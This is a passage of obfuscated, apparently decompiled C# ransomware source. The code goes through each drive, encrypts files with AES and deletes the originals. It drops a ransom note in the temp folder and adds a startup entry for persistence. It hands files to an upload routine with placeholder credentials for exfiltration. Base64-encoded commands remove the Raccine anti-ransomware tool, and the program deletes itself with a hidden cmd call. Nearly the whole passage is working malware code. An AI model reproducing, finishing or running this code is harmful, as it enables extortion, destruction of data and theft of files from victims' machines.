				jXiAMjBTnZQwioM = xhaGFQsmQqpIC("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(AKDOdYwKlSeS(jXiAMjBTnZQwioM), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AKDOdYwKlSeS("UmFjY2luZQ=="));
					registryKey.Close();
				}
				jXiAMjBTnZQwioM = xhaGFQsmQqpIC("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(AKDOdYwKlSeS(jXiAMjBTnZQwioM), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AKDOdYwKlSeS("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("dGFza2tpbGw="), AKDOdYwKlSeS("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("cmVn"), AKDOdYwKlSeS("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("cmVn"), AKDOdYwKlSeS("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("c2NodGFza3M="), AKDOdYwKlSeS("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void SAgbiLoigZOwPPj(string uDAuuWgxUfyGl, byte[] OOLtRybPdreQ)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(AKDOdYwKlSeS("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(uDAuuWgxUfyGl, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(OOLtRybPdreQ, 0, OOLtRybPdreQ.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void eqBfvUvEoFAlLF()
	{
		string jXiAMjBTnZQwioM = xhaGFQsmQqpIC("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AKDOdYwKlSeS(jXiAMjBTnZQwioM), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(AKDOdYwKlSeS("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void PtvLsYuPhmTnEdYv()
	{
		lDUkCKSsmpNIssDW("cmd.exe", AKDOdYwKlSeS("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = AKDOdYwKlSeS("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void AyKKtsOHlSG(string CrRmoZfQJJBToL)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(CrRmoZfQJJBToL);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(CrRmoZfQJJBToL, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(DQNgDvGHNxeJ, "File: " + CrRmoZfQJJBToL + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string SpBshlcYoytUROp()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string mcFFxPzZat(string DwotWTuzTydEz)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(AKDOdYwKlSeS("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(AKDOdYwKlSeS("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(DwotWTuzTydEz);
			}
			else
			{
				File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + DwotWTuzTydEz);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(DQNgDvGHNxeJ, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void PntdKUbpJFYEyYwY(string DHAsuTfSLkqpZuYNp, string gHTlNIkTuKKw)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + DHAsuTfSLkqpZuYNp + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + gHTlNIkTuKKw);
		streamWriter.WriteLine("IconIndex=0");
		string text = gHTlNIkTuKKw.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void zgEGVOYtvJJw(string[] KlXztdeifbuEdq, string[] sgXjHxvETHzxtjY, string[] ePYJAvlIwXw, string RapcJRiIXdLt, string vgSbYpgPbsAVr)
	{
		DpIdTjeHJcSMdxf = Encoding.ASCII.GetBytes(RapcJRiIXdLt);
		DriveInfo[] array = null;
		if (KlXztdeifbuEdq[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !VixAiWNPKoHGQJKOH.Contains(array[i].Name))
					{
						VixAiWNPKoHGQJKOH.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < KlXztdeifbuEdq.Length; j++)
			{
				if (!VixAiWNPKoHGQJKOH.Contains(KlXztdeifbuEdq[j]))
				{
					VixAiWNPKoHGQJKOH.Add(KlXztdeifbuEdq[j]);
				}
			}
		}
		if (VixAiWNPKoHGQJKOH.Contains(AKDOdYwKlSeS("Qzpc")) && jOarUkoDXZg == "YES")
		{
			VixAiWNPKoHGQJKOH.Remove(AKDOdYwKlSeS("Qzpc"));
		}
		Parallel.ForEach(VixAiWNPKoHGQJKOH, delegate(string t)
		{
			if (sedwieDsphpNS && !SpBshlcYoytUROp().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						TODKGZbpyhrvar(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (coIRNZWTDTfr == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GPTiDckmIEiJjsVCA(t, sgXjHxvETHzxtjY, vgSbYpgPbsAVr, ePYJAvlIwXw, RapcJRiIXdLt);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GPTiDckmIEiJjsVCA(t, sgXjHxvETHzxtjY, vgSbYpgPbsAVr, ePYJAvlIwXw, RapcJRiIXdLt);
			}
		});
	}

	public static void GPTiDckmIEiJjsVCA(string FnaXoWPNCxshDhB, string[] xnYZmUzNIQ, string jvULJMQEny, string[] XYVFOborfw, string OILcpxpFKO)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (fMXfjKbcGeqYLY == "NO")
		{
			list = egcSvkHHxSUSVFS(FnaXoWPNCxshDhB, xnYZmUzNIQ, jvULJMQEny, XYVFOborfw, OILcpxpFKO);
			return;
		}
		list = hBkSADqVuRNlqOY.SearchFiles(FnaXoWPNCxshDhB);
		foreach (string text in xnYZmUzNIQ)
		{
			foreach (string item in list)
			{
				if (XYVFOborfw.Length != 0)
				{
					int num = 0;
					while (num < XYVFOborfw.Length)
					{
						string value = XYVFOborfw[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f2;
					}
				}
				if ((DwYpWezEMthh == "NO" && !item.EndsWith(text)) || IBplFKRVOPC.Contains(item))
				{
					continue;
				}
				if (RLjMSFJztkabg == "YES")
				{
					try
					{
						if (gkqsFnLNsaPC.UuibpKQXVzQll(item))
						{
							gkqsFnLNsaPC.IbIrMsEgVUA(item);
						}
					}
					catch
					{
					}
				}
				IBplFKRVOPC.Add(item);
				if (!xoGEPqVelYnAq.Contains(Path.GetDirectoryName(item)))
				{
					xoGEPqVelYnAq.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (BeKYwfgbwwB == "YES" && fileStream.Length > Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024 && !list3.Contains(text))
					{
						if (wfmEWWtWllHAhUQ == "YES")
						{
							foreach (string item2 in cSaUketXdIT)
							{
								if (item.ToLower().EndsWith(item2) && LzQEwfyRsi == "YES")
								{
									if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LzQEwfyRsi == "NO")
								{
									try
									{
										TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] hIyUtbdxliGi = NLyEBDclVkby.trQgagTyanuA(item, Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024);
						byte[] bwoldggmWz = NLyEBDclVkby.uLYqguvCGZXF(hIyUtbdxliGi, Encoding.ASCII.GetBytes(OILcpxpFKO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						NLyEBDclVkby.aMuoWrgJGubRR(item, bwoldggmWz);
						if (jvULJMQEny != ".*")
						{
							File.Move(item, item + jvULJMQEny);
						}
					}
					else if (jvULJMQEny != ".*")
					{
						bNToWrqJVsZ(item, item + jvULJMQEny, DpIdTjeHJcSMdxf);
					}
					else
					{
						bNToWrqJVsZ(item, item + ".part", DpIdTjeHJcSMdxf);
					}
				}
				catch (Exception)
				{
				}
				IL_02f2:;
			}
		}
	}

	public static void oWkmattkNKtf(List<string> NjvzfVCYoaB, string[] vZJDNWcNtyDL, string dVegnlOoKUo, string[] puLbMtjoFnfaohv, string zOhyUZDNSwusT)
	{
		List<string> zaBTclTxmNICJV = new List<string> { "" };
		if (DwYpWezEMthh == "NO")
		{
			string OXLMCcDbwZnmOJS;
			Parallel.ForEach(vZJDNWcNtyDL, delegate(string t1)
			{
				foreach (string item in NjvzfVCYoaB)
				{
					if (puLbMtjoFnfaohv.Length != 0)
					{
						string[] array4 = puLbMtjoFnfaohv;
						int num2 = 0;
						while (num2 < array4.Length)
						{
							string value2 = array4[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_05e6;
						}
					}
					try
					{
						if (item.EndsWith(dVegnlOoKUo))
						{
							goto IL_05e6;
						}
					}
					catch (Exception)
					{
						goto IL_05e6;
					}
					if (item.EndsWith(t1) && !IBplFKRVOPC.Contains(item))
					{
						if (RLjMSFJztkabg == "YES")
						{
							try
							{
								if (gkqsFnLNsaPC.UuibpKQXVzQll(item))
								{
									gkqsFnLNsaPC.IbIrMsEgVUA(item);
								}
							}
							catch
							{
							}
						}
						IBplFKRVOPC.Add(item);
						if (!xoGEPqVelYnAq.Contains(Path.GetDirectoryName(item)))
						{
							xoGEPqVelYnAq.Add(Path.GetDirectoryName(item));
						}
						AyKKtsOHlSG(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00e5;
								}
								goto end_IL_00e5_2;
								end_IL_00e5:;
							}
							catch (Exception ex12)
							{
								if (nsUlKTEfYADHHkY)
								{
									try
									{
										File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while reading if filesize is zero: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00e5_2;
							}
							if (BeKYwfgbwwB == "YES" && new FileInfo(item).Length > Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024 && !zaBTclTxmNICJV.Contains(t1))
							{
								try
								{
									if (dVegnlOoKUo != ".*")
									{
										File.Move(item, item + dVegnlOoKUo);
									}
								}
								catch (Exception ex14)
								{
									if (!nsUlKTEfYADHHkY)
									{
										break;
									}
									try
									{
										File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								OXLMCcDbwZnmOJS = "";
								if (dVegnlOoKUo != ".*")
								{
									OXLMCcDbwZnmOJS = item + dVegnlOoKUo;
								}
								else
								{
									OXLMCcDbwZnmOJS = item;
								}
								if (wfmEWWtWllHAhUQ == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in cSaUketXdIT)
										{
											if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item2 + dVegnlOoKUo) && LzQEwfyRsi == "YES")
											{
												if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(OXLMCcDbwZnmOJS).Length)
												{
													try
													{
														TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
													}
													catch
													{
													}
												}
											}
											else if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item2) && LzQEwfyRsi == "NO")
											{
												try
												{
													TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
								string s3 = IyNwnTsFDBq.QaROgAqvhnuv(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array5 = null;
								byte[] array6 = NLyEBDclVkby.trQgagTyanuA(OXLMCcDbwZnmOJS, Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024);
								NLyEBDclVkby.aMuoWrgJGubRR(BwoldggmWz: (!mycxcOOgXQRz) ? (UAlXLRmTzVC ? NLyEBDclVkby.uLYqguvCGZXF(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NLyEBDclVkby.uLYqguvCGZXF(array6, Encoding.ASCII.GetBytes(zOhyUZDNSwusT), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UAlXLRmTzVC ? gmbpOOqXTPC.luhQvjGvnCGKIw(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gmbpOOqXTPC.luhQvjGvnCGKIw(array6, Encoding.ASCII.GetBytes(zOhyUZDNSwusT), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ERhyBPUuEpFw: OXLMCcDbwZnmOJS, QkwxraZpWpqtj: bytes3);
							}
							else
							{
								string text4 = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
								string s4 = IyNwnTsFDBq.QaROgAqvhnuv(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (dVegnlOoKUo != ".*")
								{
									if (!FmlwPIlyMKyrWsO)
									{
										if (!UAlXLRmTzVC)
										{
											syAUxlbcKlOS(item, item + dVegnlOoKUo, DpIdTjeHJcSMdxf);
										}
										else
										{
											syAUxlbcKlOS(item, item + dVegnlOoKUo, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!UAlXLRmTzVC)
											{
												sYNOQnJviugUg(item, item + dVegnlOoKUo, DpIdTjeHJcSMdxf);
											}
											else
											{
												sYNOQnJviugUg(item, item + dVegnlOoKUo, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (nsUlKTEfYADHHkY)
											{
												try
												{
													File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while fully writing to file: " + ex16.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!FmlwPIlyMKyrWsO)
								{
									if (!UAlXLRmTzVC)
									{
										syAUxlbcKlOS(item, item + ".part", DpIdTjeHJcSMdxf);
									}
									else
									{
										syAUxlbcKlOS(item, item + ".part", Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!UAlXLRmTzVC)
										{
											sYNOQnJviugUg(item, item, DpIdTjeHJcSMdxf);
										}
										else
										{
											sYNOQnJviugUg(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (nsUlKTEfYADHHkY)
										{
											try
											{
												File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while fully writing to file: " + ex18.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (UAlXLRmTzVC)
								{
									if (dVegnlOoKUo != ".*")
									{
										SAgbiLoigZOwPPj(item + dVegnlOoKUo, bytes4);
									}
									else
									{
										SAgbiLoigZOwPPj(item, bytes4);
									}
								}
							}
							goto IL_05e6;
							end_IL_00e5_2:;
						}
						catch (Exception)
						{
							goto IL_05e6;
						}
					}
					continue;
					IL_05e6:
					NjvzfVCYoaB.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(NjvzfVCYoaB, delegate(string fileInfo)
		{
			if (puLbMtjoFnfaohv.Length != 0)
			{
				string[] array = puLbMtjoFnfaohv;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(dVegnlOoKUo))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!IBplFKRVOPC.Contains(fileInfo))
			{
				if (RLjMSFJztkabg == "YES")
				{
					try
					{
						if (gkqsFnLNsaPC.UuibpKQXVzQll(fileInfo))
						{
							gkqsFnLNsaPC.IbIrMsEgVUA(fileInfo);
						}
					}
					catch
					{
					}
				}
				IBplFKRVOPC.Add(fileInfo);
				if (!xoGEPqVelYnAq.Contains(Path.GetDirectoryName(fileInfo)))
				{
					xoGEPqVelYnAq.Add(Path.GetDirectoryName(fileInfo));
				}
				AyKKtsOHlSG(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (nsUlKTEfYADHHkY)
						{
							try
							{
								File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (BeKYwfgbwwB == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024)
					{
						try
						{
							if (dVegnlOoKUo != ".*")
							{
								File.Move(fileInfo, fileInfo + dVegnlOoKUo);
							}
						}
						catch (Exception ex4)
						{
							if (nsUlKTEfYADHHkY)
							{
								try
								{
									File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (dVegnlOoKUo != ".*")
						{
							fileInfo += dVegnlOoKUo;
						}
						if (wfmEWWtWllHAhUQ == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in cSaUketXdIT)
								{
									if (fileInfo.ToLower().EndsWith(item3 + dVegnlOoKUo) && LzQEwfyRsi == "YES")
									{
										if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item3) && LzQEwfyRsi == "NO")
									{
										try
										{
											TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s = IyNwnTsFDBq.QaROgAqvhnuv(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = NLyEBDclVkby.trQgagTyanuA(fileInfo, Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024);
						NLyEBDclVkby.aMuoWrgJGubRR(BwoldggmWz: (!mycxcOOgXQRz) ? (UAlXLRmTzVC ? NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(zOhyUZDNSwusT), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UAlXLRmTzVC ? gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(zOhyUZDNSwusT), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ERhyBPUuEpFw: fileInfo, QkwxraZpWpqtj: bytes);
					}
					else
					{
						string text2 = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s2 = IyNwnTsFDBq.QaROgAqvhnuv(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (dVegnlOoKUo != ".*")
						{
							if (!FmlwPIlyMKyrWsO)
							{
								if (!UAlXLRmTzVC)
								{
									syAUxlbcKlOS(fileInfo, fileInfo + dVegnlOoKUo, DpIdTjeHJcSMdxf);
								}
								else
								{
									syAUxlbcKlOS(fileInfo, fileInfo + dVegnlOoKUo, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!UAlXLRmTzVC)
									{
										sYNOQnJviugUg(fileInfo, fileInfo + dVegnlOoKUo, DpIdTjeHJcSMdxf);
									}
									else
									{
										sYNOQnJviugUg(fileInfo, fileInfo + dVegnlOoKUo, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nsUlKTEfYADHHkY)
									{
										try
										{
											File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!FmlwPIlyMKyrWsO)
						{
							if (!UAlXLRmTzVC)
							{
								syAUxlbcKlOS(fileInfo, fileInfo + ".part", DpIdTjeHJcSMdxf);
							}
							else
							{
								syAUxlbcKlOS(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!UAlXLRmTzVC)
								{
									sYNOQnJviugUg(fileInfo, fileInfo, DpIdTjeHJcSMdxf);
								}
								else
								{
									sYNOQnJviugUg(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nsUlKTEfYADHHkY)
								{
									try
									{
										File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (UAlXLRmTzVC)
						{
							if (dVegnlOoKUo != ".*")
							{
								SAgbiLoigZOwPPj(fileInfo + dVegnlOoKUo, bytes2);
							}
							else
							{
								SAgbiLoigZOwPPj(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			NjvzfVCYoaB.Remove(fileInfo);
		});
	}

	private static void bNToWrqJVsZ(string RcWKifQmUKpH, string jhlHKjxqQYMauX, byte[] XvoZeScftCFD)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(jhlHKjxqQYMauX, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(XvoZeScftCFD, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(RcWKifQmUKpH, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (jhlHKjxqQYMauX.Length > 0)
				{
					FileStream fileStream3 = new FileStream(RcWKifQmUKpH, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (wfmEWWtWllHAhUQ == "YES")
					{
						foreach (string item in cSaUketXdIT)
						{
							if (RcWKifQmUKpH.ToLower().EndsWith(item) && LzQEwfyRsi == "YES")
							{
								if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", RcWKifQmUKpH);
									}
									catch
									{
									}
								}
							}
							else if (RcWKifQmUKpH.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
							{
								try
								{
									TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", RcWKifQmUKpH);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(RcWKifQmUKpH) && num2 >= 0)
							{
								File.Delete(RcWKifQmUKpH);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (jhlHKjxqQYMauX.EndsWith(".part"))
					{
						File.Move(jhlHKjxqQYMauX, jhlHKjxqQYMauX.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(jhlHKjxqQYMauX);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void sYNOQnJviugUg(string NMptsPwAFgqPsjO, string TzWSOhZxKOiFnxTy, byte[] YilcQEgimcQT)
	{
		if (wfmEWWtWllHAhUQ == "YES")
		{
			FileStream fileStream = new FileStream(NMptsPwAFgqPsjO, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in cSaUketXdIT)
			{
				if (NMptsPwAFgqPsjO.ToLower().EndsWith(item) && LzQEwfyRsi == "YES")
				{
					if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", NMptsPwAFgqPsjO);
						}
						catch
						{
						}
					}
				}
				else if (NMptsPwAFgqPsjO.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
				{
					try
					{
